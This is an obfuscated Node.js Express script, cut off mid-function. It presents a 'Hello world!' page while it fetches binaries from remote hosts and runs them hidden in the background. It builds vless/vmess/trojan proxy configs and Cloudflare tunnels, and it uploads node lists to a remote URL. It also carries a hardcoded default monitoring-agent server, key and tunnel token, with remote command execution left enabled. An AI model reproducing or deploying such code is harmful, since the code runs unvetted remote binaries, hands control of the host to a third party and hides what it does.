const _0x2f5a20=_0x2ce4;(function(_0x29fc62,_0x535da3){const _0x2b8079={_0x4e5da5:0x143,_0x6d1a47:0x129,_0x5b7b34:0x132},_0x5081ee=_0x2ce4,_0x204c6a=_0x29fc62();while(!![]){try{const _0x21e488=parseInt(_0x5081ee(0x1a2))/0x1+parseInt(_0x5081ee(0x1d3))/0x2+-parseInt(_0x5081ee(0x1ae))/0x3+parseInt(_0x5081ee(_0x2b8079._0x4e5da5))/0x4*(parseInt(_0x5081ee(_0x2b8079._0x6d1a47))/0x5)+parseInt(_0x5081ee(_0x2b8079._0x5b7b34))/0x6+-parseInt(_0x5081ee(0x1e8))/0x7+-parseInt(_0x5081ee(0x17e))/0x8*(parseInt(_0x5081ee(0x1be))/0x9);if(_0x21e488===_0x535da3)break;else _0x204c6a['push'](_0x204c6a['shift']());}catch(_0x417249){_0x204c6a['push'](_0x204c6a['shift']());}}}(_0x2769,0x6059e));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x2f5a20(0x194)),{promisify}=require(_0x2f5a20(0x1d1)),exec=promisify(require(_0x2f5a20(0x16d))[_0x2f5a20(0x1d7)]),{execSync}=require(_0x2f5a20(0x16d)),UPLOAD_URL=process[_0x2f5a20(0x19c)][_0x2f5a20(0x16c)]||'',PROJECT_URL=process[_0x2f5a20(0x19c)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x2f5a20(0x19c)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2f5a20(0x19c)][_0x2f5a20(0x1e9)]||_0x2f5a20(0x13c),SUB_PATH=process['env'][_0x2f5a20(0x1b3)]||'sub',PORT=process[_0x2f5a20(0x19c)][_0x2f5a20(0x193)]||process[_0x2f5a20(0x19c)][_0x2f5a20(0x15c)]||0xbb8,UUID=process[_0x2f5a20(0x19c)]['UUID']||_0x2f5a20(0x15f),NEZHA_SERVER=process[_0x2f5a20(0x19c)]['NEZHA_SERVER']||_0x2f5a20(0x13d),NEZHA_PORT=process[_0x2f5a20(0x19c)][_0x2f5a20(0x13e)]||'',NEZHA_KEY=process['env'][_0x2f5a20(0x173)]||'zBvKgZ5cLySLuM6d7tM0D7y61DOmNRLY',ARGO_DOMAIN=process['env'][_0x2f5a20(0x145)]||'nf.daat.nyc.mn',ARGO_AUTH=process[_0x2f5a20(0x19c)][_0x2f5a20(0x15d)]||_0x2f5a20(0x12c),ARGO_PORT=process[_0x2f5a20(0x19c)]['ARGO_PORT']||0x1f41,CFIP=process[_0x2f5a20(0x19c)][_0x2f5a20(0x1d8)]||_0x2f5a20(0x172),CFPORT=process[_0x2f5a20(0x19c)][_0x2f5a20(0x1e5)]||0x1bb,NAME=process[_0x2f5a20(0x19c)][_0x2f5a20(0x167)]||_0x2f5a20(0x1cd);!fs[_0x2f5a20(0x17a)](FILE_PATH)?(fs[_0x2f5a20(0x1aa)](FILE_PATH),console[_0x2f5a20(0x197)](FILE_PATH+_0x2f5a20(0x19e))):console[_0x2f5a20(0x197)](FILE_PATH+_0x2f5a20(0x1da));function generateRandomName(){const _0x2b7003={_0x58602f:0x148,_0x351ead:0x1d6,_0x22f085:0x153},_0x56e137=_0x2f5a20,_0x4a4146=_0x56e137(_0x2b7003._0x58602f);let _0x3209f1='';for(let _0x23fc03=0x0;_0x23fc03<0x6;_0x23fc03++){_0x3209f1+=_0x4a4146[_0x56e137(_0x2b7003._0x351ead)](Math['floor'](Math[_0x56e137(_0x2b7003._0x22f085)]()*_0x4a4146[_0x56e137(0x19f)]));}return _0x3209f1;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2f5a20(0x1ab)](FILE_PATH,npmName),phpPath=path[_0x2f5a20(0x1ab)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x2f5a20(0x1ab)](FILE_PATH,botName),subPath=path[_0x2f5a20(0x1ab)](FILE_PATH,_0x2f5a20(0x1a3)),listPath=path[_0x2f5a20(0x1ab)](FILE_PATH,_0x2f5a20(0x1cc)),bootLogPath=path[_0x2f5a20(0x1ab)](FILE_PATH,'boot.log'),configPath=path[_0x2f5a20(0x1ab)](FILE_PATH,'config.json');function deleteNodes(){const _0x225ef6={_0x9597ee:0x135,_0xb069fa:0x183,_0x27f13f:0x151,_0x4dc580:0x155,_0x27781f:0x1b7},_0x17c183=_0x2f5a20;try{if(!UPLOAD_URL)return;if(!fs[_0x17c183(0x17a)](subPath))return;let _0x20c9bc;try{_0x20c9bc=fs[_0x17c183(0x1a1)](subPath,_0x17c183(_0x225ef6._0x9597ee));}catch{return null;}const _0xbab067=Buffer[_0x17c183(_0x225ef6._0xb069fa)](_0x20c9bc,_0x17c183(0x1bf))[_0x17c183(0x196)](_0x17c183(0x135)),_0x1dd3e9=_0xbab067[_0x17c183(_0x225ef6._0x27f13f)]('\x0a')['filter'](_0x1374fe=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1374fe));if(_0x1dd3e9['length']===0x0)return;return axios[_0x17c183(0x1a6)](UPLOAD_URL+_0x17c183(_0x225ef6._0x4dc580),JSON[_0x17c183(_0x225ef6._0x27781f)]({'nodes':_0x1dd3e9}),{'headers':{'Content-Type':_0x17c183(0x12b)}})[_0x17c183(0x152)](_0x1d635f=>{return null;}),null;}catch(_0x6b5f32){return null;}}function cleanupOldFiles(){const _0x4a61d1={_0x1a8398:0x1ee},_0x910688={_0x3d5841:0x1a4},_0x1cfb58=_0x2f5a20;try{const _0xb1fcbb=fs[_0x1cfb58(_0x4a61d1._0x1a8398)](FILE_PATH);_0xb1fcbb[_0x1cfb58(0x158)](_0x2f9b14=>{const _0x1d8028=_0x1cfb58,_0x4864a9=path[_0x1d8028(0x1ab)](FILE_PATH,_0x2f9b14);try{const _0x131e02=fs[_0x1d8028(0x128)](_0x4864a9);_0x131e02[_0x1d8028(0x160)]()&&fs[_0x1d8028(_0x910688._0x3d5841)](_0x4864a9);}catch(_0x12642b){}});}catch(_0x23e411){}}function _0x2769(){const _0xbdcb51=['tcp','vless','win32','&fp=firefox&type=ws&host=','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','existsSync','\x20-s\x20','arm64','error','488WWxCcW','https+local://8.8.8.8/dns-query','--tls','TunnelSecret','&path=%2Fvless-argo%3Fed%3D2560#','from','config.json','https://arm64.ssss.nyc.mn/agent','pkill\x20-f\x20\x22[','status','https://arm64.ssss.nyc.mn/bot','automatic\x20access\x20task\x20added\x20successfully','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x22\x20>\x20/dev/null\x202>&1','pop','\x20>/dev/null\x202>&1','\x0aclient_secret:\x20','xtls-rprx-vision','\x20-c\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','nohup\x20','SERVER_PORT','path','\x20>/dev/null\x202>&1\x20&','toString','log','ArgoDomain:','2053','Error\x20reading\x20boot.log:','tls','env','vmess','\x20is\x20created','length','\x20successfully','readFileSync','577790GhXYDQ','sub.txt','unlinkSync','App\x20is\x20running','post','\x0a\x20\x20\x0atrojan://','tunnel.yml','basename','mkdirSync','join','all','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','58686iLgpQy','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','has','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','SUB_PATH','boot.log','\x0a\x20\x20credentials-file:\x20','del\x20/f\x20/q\x20','stringify','/dev/null','Empowerment\x20failed\x20for\x20','blackhole','https://amd64.ssss.nyc.mn/agent','npm\x20running\x20error:\x20','get','204237wyHIbm','base64','web\x20running\x20error:\x20','freedom','fileName','https://amd64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tunnel.json','rm\x20-rf\x20','?security=tls&sni=','direct','substring','.exe\x20>\x20nul\x202>&1','http\x20server\x20is\x20running\x20on\x20port:','list.txt','Northflank','\x20is\x20running','unlink','send','util','/api/add-subscriptions','660336cFgMnu','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://oooo.serv00.net/add-url','charAt','exec','CFIP','false','\x20already\x20exists','text/plain;\x20charset=utf-8','Empowerment\x20success\x20for\x20','/config.json\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20tunnel:\x20','2096','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Add\x20automatic\x20access\x20task\x20faild:\x20','Nodes\x20uploaded\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','aarch64','CFPORT','ARGO_DOMAIN:','close','260036HKhmuz','FILE_PATH','Download\x20','stream','\x20-p\x20','true','readdirSync','Error\x20executing\x20command:\x20','config.yaml','statSync','1210130MueWgL','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','application/json','eyJhIjoiNGU5MDBkNjlkMTliODc4ZmM5NDgyNzFmNzJiMTJkZDYiLCJ0IjoiNGE2YzViMDAtZDYzMS00ZGUwLTkzMWQtYzZhODM1YjFmZTM5IiwicyI6Ik1HWXpOMlV6TnpjdE16TTRaUzAwWWpobUxUZ3pNREl0TWpJeE5ERmhNR1k1WVRsbCJ9','match','Content-Type','fileUrl','8443','quic','1209606YGWMOQ','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/vless-argo','utf-8','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','platform','&path=%2Ftrojan-argo%3Fed%3D2560#','then','clear','\x20failed:\x20','./tmp','nz.daat.nyc.mn:8008','NEZHA_PORT','Unhandled\x20error\x20in\x20startserver:','/tunnel.yml\x20run','/vmess-argo','\x0a\x20\x20\x20\x20','12GXTyBi','arch','ARGO_DOMAIN','\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/web','abcdefghijklmnopqrstuvwxyz','none','2083','https://arm64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','block','/trojan-argo','response','127.0.0.1','split','catch','random','\x0avless://','/api/delete-nodes','map','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','forEach','listen','arm','https://amd64.ssss.nyc.mn/v1','PORT','ARGO_AUTH','Subscription\x20uploaded\x20successfully','b38adb6f-81be-4bdd-b89f-8d1b78bece91','isFile','test','createWriteStream','\x0a\x20\x20\x0avmess://','2087','/sub.txt\x20saved\x20successfully','push','NAME','http','443','includes','writeFileSync','UPLOAD_URL','child_process','chmod','message','set','data','cf.930318.xyz','NEZHA_KEY','Skipping\x20adding\x20automatic\x20access\x20task'];_0x2769=function(){return _0xbdcb51;};return _0x2769();}app[_0x2f5a20(0x1bd)]('/',function(_0x352520,_0x4ff088){const _0x39c7f9={_0xcc40ab:0x1d0},_0x51dafe=_0x2f5a20;_0x4ff088[_0x51dafe(_0x39c7f9._0xcc40ab)]('Hello\x20world!');});function _0x2ce4(_0x56af33,_0x3bedb9){const _0x276931=_0x2769();return _0x2ce4=function(_0x2ce4b0,_0x1305a3){_0x2ce4b0=_0x2ce4b0-0x128;let _0x33eedb=_0x276931[_0x2ce4b0];return _0x33eedb;},_0x2ce4(_0x56af33,_0x3bedb9);}async function generateConfig(){const _0x4d0cad={_0x25c536:0x149,_0x135df5:0x134,_0x2e03ae:0x14e,_0x284ceb:0x150,_0x4bafc1:0x150,_0x3170b0:0x176,_0x33d73e:0x131,_0x19fef8:0x149,_0x113eac:0x1c8,_0x380477:0x1ba,_0x5449a8:0x14d,_0x31d3f8:0x184,_0x3edc65:0x1b7},_0x165872=_0x2f5a20,_0x322e4b={'log':{'access':_0x165872(0x1b8),'error':'/dev/null','loglevel':_0x165872(0x149)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x165872(0x176),'settings':{'clients':[{'id':UUID,'flow':_0x165872(0x18f)}],'decryption':_0x165872(_0x4d0cad._0x25c536),'fallbacks':[{'dest':0xbb9},{'path':_0x165872(_0x4d0cad._0x135df5),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x165872(_0x4d0cad._0x2e03ae),'dest':0xbbc}]},'streamSettings':{'network':_0x165872(0x175)}},{'port':0xbb9,'listen':_0x165872(_0x4d0cad._0x284ceb),'protocol':_0x165872(0x176),'settings':{'clients':[{'id':UUID}],'decryption':_0x165872(0x149)},'streamSettings':{'network':_0x165872(0x175),'security':'none'}},{'port':0xbba,'listen':_0x165872(_0x4d0cad._0x4bafc1),'protocol':_0x165872(_0x4d0cad._0x3170b0),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x165872(0x149)},'streamSettings':{'network':'ws','security':_0x165872(0x149),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x165872(0x131)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x165872(_0x4d0cad._0x4bafc1),'protocol':_0x165872(0x19d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x165872(0x141)}},'sniffing':{'enabled':!![],'destOverride':[_0x165872(0x168),_0x165872(0x19b),_0x165872(_0x4d0cad._0x33d73e)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x165872(_0x4d0cad._0x19fef8),'wsSettings':{'path':_0x165872(0x14e)}},'sniffing':{'enabled':!![],'destOverride':[_0x165872(0x168),'tls',_0x165872(_0x4d0cad._0x33d73e)],'metadataOnly':![]}}],'dns':{'servers':[_0x165872(0x17f)]},'outbounds':[{'protocol':_0x165872(0x1c1),'tag':_0x165872(_0x4d0cad._0x113eac)},{'protocol':_0x165872(_0x4d0cad._0x380477),'tag':_0x165872(_0x4d0cad._0x5449a8)}]};fs[_0x165872(0x16b)](path[_0x165872(0x1ab)](FILE_PATH,_0x165872(_0x4d0cad._0x31d3f8)),JSON[_0x165872(_0x4d0cad._0x3edc65)](_0x322e4b,null,0x2));}function getSystemArchitecture(){const _0x4aee14={_0x4d8c65:0x17c},_0xdae4fa=_0x2f5a20,_0x1e348d=os[_0xdae4fa(0x144)]();return _0x1e348d===_0xdae4fa(0x15a)||_0x1e348d===_0xdae4fa(_0x4aee14._0x4d8c65)||_0x1e348d===_0xdae4fa(0x1e4)?_0xdae4fa(0x15a):'amd';}function downloadFile(_0x871b32,_0x143722,_0x2b2b2a){const _0x580ea0={_0x500ea8:0x1aa,_0x4f46a6:0x162,_0x36bb43:0x1bd},_0x3d0145={_0x46d5ba:0x1a9,_0xb8c3f4:0x16f},_0x19d114={_0x18ec12:0x171,_0x578766:0x17d},_0x42aae0={_0x18912f:0x197,_0x3c745c:0x1a0},_0x15ec22=_0x2f5a20,_0x5da3d8=_0x871b32;!fs[_0x15ec22(0x17a)](FILE_PATH)&&fs[_0x15ec22(_0x580ea0._0x500ea8)](FILE_PATH,{'recursive':!![]});const _0x315998=fs[_0x15ec22(_0x580ea0._0x4f46a6)](_0x5da3d8);axios({'method':_0x15ec22(_0x580ea0._0x36bb43),'url':_0x143722,'responseType':_0x15ec22(0x1eb)})[_0x15ec22(0x139)](_0x31f0e5=>{const _0x482961={_0x2d4e2a:0x13b,_0x4eb253:0x17d},_0x158a3b=_0x15ec22;_0x31f0e5[_0x158a3b(_0x19d114._0x18ec12)]['pipe'](_0x315998),_0x315998['on']('finish',()=>{const _0x165627=_0x158a3b;_0x315998[_0x165627(0x1e7)](),console[_0x165627(_0x42aae0._0x18912f)]('Download\x20'+path['basename'](_0x5da3d8)+_0x165627(_0x42aae0._0x3c745c)),_0x2b2b2a(null,_0x5da3d8);}),_0x315998['on'](_0x158a3b(_0x19d114._0x578766),_0x337e58=>{const _0x1b9481=_0x158a3b;fs[_0x1b9481(0x1cf)](_0x5da3d8,()=>{});const _0x5985df=_0x1b9481(0x1ea)+path[_0x1b9481(0x1a9)](_0x5da3d8)+_0x1b9481(_0x482961._0x2d4e2a)+_0x337e58[_0x1b9481(0x16f)];console[_0x1b9481(_0x482961._0x4eb253)](_0x5985df),_0x2b2b2a(_0x5985df);});})[_0x15ec22(0x152)](_0x2721fc=>{const _0x863105=_0x15ec22,_0xdf7006=_0x863105(0x1ea)+path[_0x863105(_0x3d0145._0x46d5ba)](_0x5da3d8)+'\x20failed:\x20'+_0x2721fc[_0x863105(_0x3d0145._0xb8c3f4)];console[_0x863105(0x17d)](_0xdf7006),_0x2b2b2a(_0xdf7006);});}async function downloadFilesAndRun(){const _0x17b9b1={_0x594e40:0x16a,_0x17ba3d:0x18c,_0x231814:0x130,_0x56a5d9:0x1df,_0x2d5701:0x164,_0x24dd32:0x199,_0x31f7c4:0x1d9,_0x479b65:0x18e,_0x19d692:0x179,_0x37dcb6:0x1af,_0x4560dc:0x1ab,_0x465378:0x1f0,_0x22b985:0x192,_0x1d4d6c:0x1ce,_0x37abcc:0x17d,_0x192697:0x14a,_0x673924:0x180,_0x482676:0x1ec,_0x5ac687:0x1ce,_0x48c8e3:0x1bc,_0x17fb5c:0x197,_0x13dd16:0x191,_0x41f510:0x192,_0x157427:0x12d,_0xee5515:0x140,_0x4418d0:0x1c4,_0x3af29b:0x195},_0x6a980c=_0x2f5a20,_0xff5fbd=getSystemArchitecture(),_0x29b803=getFilesForArchitecture(_0xff5fbd);if(_0x29b803[_0x6a980c(0x19f)]===0x0){console[_0x6a980c(0x197)](_0x6a980c(0x133));return;}const _0x36fecc=_0x29b803[_0x6a980c(0x156)](_0x241978=>{const _0x478b01={_0x15a7b6:0x12f};return new Promise((_0x205e42,_0x536ed5)=>{const _0x54d0d8=_0x2ce4;downloadFile(_0x241978[_0x54d0d8(0x1c2)],_0x241978[_0x54d0d8(_0x478b01._0x15a7b6)],(_0x2894c2,_0x3db232)=>{_0x2894c2?_0x536ed5(_0x2894c2):_0x205e42(_0x3db232);});});});try{await Promise[_0x6a980c(0x1ac)](_0x36fecc);}catch(_0x6ce409){console[_0x6a980c(0x17d)]('Error\x20downloading\x20files:',_0x6ce409);return;}function _0x276c95(_0x286fd3){const _0x37f160=_0x6a980c,_0x4c5984=0x1fd;_0x286fd3[_0x37f160(0x158)](_0x47038a=>{const _0x46559a={_0x16f3a9:0x1b9},_0x3d0807=_0x37f160;fs[_0x3d0807(0x17a)](_0x47038a)&&fs[_0x3d0807(0x16e)](_0x47038a,_0x4c5984,_0x4e7d5a=>{const _0x259d00=_0x3d0807;_0x4e7d5a?console[_0x259d00(0x17d)](_0x259d00(_0x46559a._0x16f3a9)+_0x47038a+':\x20'+_0x4e7d5a):console['log'](_0x259d00(0x1dc)+_0x47038a+':\x20'+_0x4c5984['toString'](0x8));});});}const _0x4dc1f9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x276c95(_0x4dc1f9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x405ba3=NEZHA_SERVER[_0x6a980c(_0x17b9b1._0x594e40)](':')?NEZHA_SERVER[_0x6a980c(0x151)](':')[_0x6a980c(_0x17b9b1._0x17ba3d)]():'',_0x28288a=new Set([_0x6a980c(0x169),_0x6a980c(_0x17b9b1._0x231814),_0x6a980c(_0x17b9b1._0x56a5d9),_0x6a980c(_0x17b9b1._0x2d5701),_0x6a980c(0x14a),_0x6a980c(_0x17b9b1._0x24dd32)]),_0x1327b8=_0x28288a[_0x6a980c(0x1b0)](_0x405ba3)?_0x6a980c(0x1ed):_0x6a980c(_0x17b9b1._0x31f7c4),_0x3d1770=_0x6a980c(_0x17b9b1._0x479b65)+NEZHA_KEY+_0x6a980c(_0x17b9b1._0x19d692)+NEZHA_SERVER+_0x6a980c(0x1e3)+_0x1327b8+_0x6a980c(_0x17b9b1._0x37dcb6)+UUID;fs[_0x6a980c(0x16b)](path[_0x6a980c(_0x17b9b1._0x4560dc)](FILE_PATH,_0x6a980c(_0x17b9b1._0x465378)),_0x3d1770);const _0x242890=_0x6a980c(_0x17b9b1._0x22b985)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x242890),console['log'](phpName+_0x6a980c(_0x17b9b1._0x1d4d6c)),await new Promise(_0x29ab1f=>setTimeout(_0x29ab1f,0x3e8));}catch(_0x1e18c5){console[_0x6a980c(_0x17b9b1._0x37abcc)]('php\x20running\x20error:\x20'+_0x1e18c5);}}else{let _0x926d57='';const _0x24866f=[_0x6a980c(0x169),'8443','2096',_0x6a980c(0x164),_0x6a980c(_0x17b9b1._0x192697),_0x6a980c(0x199)];_0x24866f[_0x6a980c(0x16a)](NEZHA_PORT)&&(_0x926d57=_0x6a980c(_0x17b9b1._0x673924));const _0x58b6dd=_0x6a980c(0x192)+npmPath+_0x6a980c(0x17b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x6a980c(_0x17b9b1._0x482676)+NEZHA_KEY+'\x20'+_0x926d57+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x58b6dd),console[_0x6a980c(0x197)](npmName+_0x6a980c(_0x17b9b1._0x5ac687)),await new Promise(_0x3bbb95=>setTimeout(_0x3bbb95,0x3e8));}catch(_0x55307b){console['error'](_0x6a980c(_0x17b9b1._0x48c8e3)+_0x55307b);}}}else console[_0x6a980c(_0x17b9b1._0x17fb5c)](_0x6a980c(_0x17b9b1._0x13dd16));const _0x1a74d3=_0x6a980c(_0x17b9b1._0x41f510)+webPath+_0x6a980c(0x190)+FILE_PATH+_0x6a980c(0x1dd);try{await exec(_0x1a74d3),console[_0x6a980c(0x197)](webName+'\x20is\x20running'),await new Promise(_0x2ef839=>setTimeout(_0x2ef839,0x3e8));}catch(_0xd90497){console[_0x6a980c(0x17d)](_0x6a980c(0x1c0)+_0xd90497);}if(fs['existsSync'](botPath)){let _0x5e4591;if(ARGO_AUTH[_0x6a980c(_0x17b9b1._0x157427)](/^[A-Z0-9a-z=]{120,250}$/))_0x5e4591=_0x6a980c(0x157)+ARGO_AUTH;else ARGO_AUTH[_0x6a980c(_0x17b9b1._0x157427)](/TunnelSecret/)?_0x5e4591=_0x6a980c(0x14c)+FILE_PATH+_0x6a980c(_0x17b9b1._0xee5515):_0x5e4591=_0x6a980c(_0x17b9b1._0x4418d0)+FILE_PATH+_0x6a980c(0x1b1)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5e4591+_0x6a980c(_0x17b9b1._0x3af29b)),console[_0x6a980c(_0x17b9b1._0x17fb5c)](botName+_0x6a980c(0x1ce)),await new Promise(_0x741cba=>setTimeout(_0x741cba,0x7d0));}catch(_0xf4c839){console[_0x6a980c(0x17d)](_0x6a980c(0x1ef)+_0xf4c839);}}await new Promise(_0x44d098=>setTimeout(_0x44d098,0x1388));}function getFilesForArchitecture(_0x3da0fb){const _0x32a84a={_0x98c10f:0x147,_0x21bd79:0x188,_0x2b74f4:0x15a},_0x3937f6=_0x2f5a20;let _0x17786d;_0x3da0fb===_0x3937f6(0x15a)?_0x17786d=[{'fileName':webPath,'fileUrl':_0x3937f6(_0x32a84a._0x98c10f)},{'fileName':botPath,'fileUrl':_0x3937f6(_0x32a84a._0x21bd79)}]:_0x17786d=[{'fileName':webPath,'fileUrl':_0x3937f6(0x1c3)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x10029a=_0x3da0fb===_0x3937f6(0x15a)?_0x3937f6(0x185):_0x3937f6(0x1bb);_0x17786d['unshift']({'fileName':npmPath,'fileUrl':_0x10029a});}else{const _0x43459d=_0x3da0fb===_0x3937f6(_0x32a84a._0x2b74f4)?_0x3937f6(0x14b):_0x3937f6(0x15b);_0x17786d['unshift']({'fileName':phpPath,'fileUrl':_0x43459d});}}return _0x17786d;}function argoType(){const _0x4d08dd={_0x49ff27:0x1e0,_0x5b67af:0x16a,_0x57b375:0x181,_0x13cc0b:0x1de,_0x4196e0:0x151,_0x19d091:0x1b5,_0x503d8f:0x1ab,_0x4e8ee8:0x1c5,_0x31e674:0x12a,_0x41edd4:0x18a},_0x2b0d6=_0x2f5a20;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2b0d6(0x197)](_0x2b0d6(_0x4d08dd._0x49ff27));return;}if(ARGO_AUTH[_0x2b0d6(_0x4d08dd._0x5b67af)](_0x2b0d6(_0x4d08dd._0x57b375))){fs['writeFileSync'](path[_0x2b0d6(0x1ab)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0xe71345=_0x2b0d6(_0x4d08dd._0x13cc0b)+ARGO_AUTH[_0x2b0d6(_0x4d08dd._0x4196e0)]('\x22')[0xb]+_0x2b0d6(_0x4d08dd._0x19d091)+path[_0x2b0d6(_0x4d08dd._0x503d8f)](FILE_PATH,_0x2b0d6(_0x4d08dd._0x4e8ee8))+_0x2b0d6(0x1ad)+ARGO_DOMAIN+_0x2b0d6(_0x4d08dd._0x31e674)+ARGO_PORT+_0x2b0d6(0x1b2);fs['writeFileSync'](path[_0x2b0d6(_0x4d08dd._0x503d8f)](FILE_PATH,_0x2b0d6(0x1a8)),_0xe71345);}else console['log'](_0x2b0d6(_0x4d08dd._0x41edd4));}argoType();async function extractDomains(){const _0x1ad6d4={_0x3cd52a:0x1a1,_0x10e62f:0x135,_0x5d04dd:0x1ab,_0x2fc621:0x1c4,_0x2b6668:0x1b1,_0x5c0ac9:0x192,_0x108a77:0x17d},_0x53faa5={_0x1da6d0:0x137,_0x4df6e8:0x1ca},_0x1b56e9={_0x14eb3d:0x12d,_0x42a047:0x166},_0x17710c=_0x2f5a20;let _0x29eba7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x29eba7=ARGO_DOMAIN,console['log'](_0x17710c(0x1e6),_0x29eba7),await _0x3626e0(_0x29eba7);else try{const _0x4785a0=fs[_0x17710c(_0x1ad6d4._0x3cd52a)](path[_0x17710c(0x1ab)](FILE_PATH,_0x17710c(0x1b4)),_0x17710c(_0x1ad6d4._0x10e62f)),_0x45a3cc=_0x4785a0[_0x17710c(0x151)]('\x0a'),_0x169440=[];_0x45a3cc[_0x17710c(0x158)](_0x1a751f=>{const _0x310211=_0x17710c,_0x133701=_0x1a751f[_0x310211(_0x1b56e9._0x14eb3d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x133701){const _0x34095e=_0x133701[0x1];_0x169440[_0x310211(_0x1b56e9._0x42a047)](_0x34095e);}});if(_0x169440['length']>0x0)_0x29eba7=_0x169440[0x0],console[_0x17710c(0x197)](_0x17710c(0x198),_0x29eba7),await _0x3626e0(_0x29eba7);else{console[_0x17710c(0x197)](_0x17710c(0x136)),fs['unlinkSync'](path[_0x17710c(_0x1ad6d4._0x5d04dd)](FILE_PATH,'boot.log'));async function _0x4c606c(){const _0x54a294=_0x17710c;try{process[_0x54a294(_0x53faa5._0x1da6d0)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x54a294(_0x53faa5._0x4df6e8)):await exec(_0x54a294(0x186)+botName[_0x54a294(0x1d6)](0x0)+']'+botName[_0x54a294(0x1c9)](0x1)+_0x54a294(0x18b));}catch(_0x30b05c){}}_0x4c606c(),await new Promise(_0x20f924=>setTimeout(_0x20f924,0xbb8));const _0x25c627=_0x17710c(_0x1ad6d4._0x2fc621)+FILE_PATH+_0x17710c(_0x1ad6d4._0x2b6668)+ARGO_PORT;try{await exec(_0x17710c(_0x1ad6d4._0x5c0ac9)+botPath+'\x20'+_0x25c627+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x774175=>setTimeout(_0x774175,0xbb8)),await extractDomains();}catch(_0x5cdf02){console[_0x17710c(_0x1ad6d4._0x108a77)](_0x17710c(0x1ef)+_0x5cdf02);}}}catch(_0x13e7a3){console[_0x17710c(0x17d)](_0x17710c(0x19a),_0x13e7a3);}async function _0x3626e0(_0x2a0fb5){const _0x484c6a={_0x44bf82:0x178,_0x378517:0x182,_0x5a9656:0x163,_0x5da6bb:0x1c7,_0x58fa82:0x138,_0x504438:0x142,_0x5cae50:0x183,_0x4d469f:0x1bf},_0x5c8790=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0x2a7c6c=_0x5c8790['trim'](),_0x5b24c1=NAME?NAME+'-'+_0x2a7c6c:_0x2a7c6c;return new Promise(_0x3f3d71=>{const _0x217540={_0xa842e3:0x170,_0x2ce9f0:0x12e};setTimeout(()=>{const 